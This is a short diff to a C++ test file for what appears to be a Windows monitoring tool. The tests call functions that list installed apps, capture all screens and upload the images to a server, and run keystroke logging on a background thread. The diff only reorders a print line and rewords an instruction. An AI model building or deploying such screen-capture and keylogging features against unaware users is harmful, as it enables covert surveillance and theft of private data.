@@ -17,8 +17,9 @@ void get_windows_apps_info_TEST() {
 void take_screenshots_TEST() {
     ScreenshotsManager screenshots_manager("./images");
     auto screenshots_filepaths = screenshots_manager.take_screenshots_of_all_screens();
+    std::cout << "Screenshots successfully made" << std::endl;
+
     screenshots_manager.upload_screenshots_to_server(screenshots_filepaths);
-    std::cout << std::endl << "Screenshots successfully made" << std::endl;
     std::cout << std::endl << std::endl << "***********************************" << std::endl << std::endl << std::endl;
 }
 
@@ -41,7 +42,7 @@ void start_key_presses_logging_TEST() {
 
     std::cout << "---------- IMPORTANT ----------" << std::endl;
     std::cout << "To turn the logging off, press log_off" << std::endl;
-    std::cout << "(Logging is running on second thread so this will stop that thread)" << std::endl;
+    std::cout << "(Logging is running on second thread so typing log_off and pressing enter this will stop that thread)" << std::endl;
     std::cout << "(to turn it on again, press log_on)" << std::endl;
     std::string input;
     while (std::cin >> input) {
